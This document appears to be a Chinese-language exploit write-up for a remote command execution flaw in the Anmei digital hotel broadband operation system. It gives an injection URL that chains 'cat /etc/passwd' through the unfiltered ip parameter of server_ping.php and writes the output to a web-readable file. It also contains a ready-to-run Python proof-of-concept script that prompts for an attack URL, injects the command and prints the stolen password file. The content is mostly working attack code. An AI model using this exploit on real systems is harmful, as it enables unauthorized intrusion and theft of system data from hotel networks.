### 安美数字酒店宽带运营系统 RCE

安美数字酒店宽带运营系统 `server_ping.php` 存在远程命令执行漏洞，漏洞文 件中 IP 参数未过滤造成命令执行

![](https://pic1.imgdb.cn/item/68afb69c58cb8da5c857a3f4.png)

```apl
/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../
pq.txt&id=1
```

访问对应 txt

![](https://pic1.imgdb.cn/item/68afb6e758cb8da5c857a3fb.png)

```python
import base64
import requests
import random
import re
import json
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning


def POC_1(target_url):
    vuln_url = (
        target_url
        + "/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../pq.txt&id=1"
    )
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/86.0.4240.111 Safari/537.36"
        ),
        "Content-Type": "application/x-www-form-urlencoded",
    }

    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10)

        print("\033[36m[o] 正在执行 cat /etc/passwd > ../../pq.txt \033[0m")

        if "parent" in response.text and response.status_code == 200:
            vuln_url = target_url + "/pq.txt"
            headers = {
                "User-Agent": (
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                    "Chrome/86.0.4240.111 Safari/537.36"
                ),
                "Content-Type": "application/x-www-form-urlencoded",
            }

            response = requests.get(
                url=vuln_url, headers=headers, verify=False, timeout=10
            )

            if "root:" in response.text:
                print(
                    "\033[36m[o] 成功执行 cat /etc/passwd, 响应为:\n{} \033[0m".format(
                        response.text
                    )
                )
            else:
                print("\033[31m[x] 请求失败:{} \033[0m".format(response.text))
        else:
            print("\033[31m[x] 请求失败 \033[0m")

    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)


if __name__ == "__main__":
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url)
```

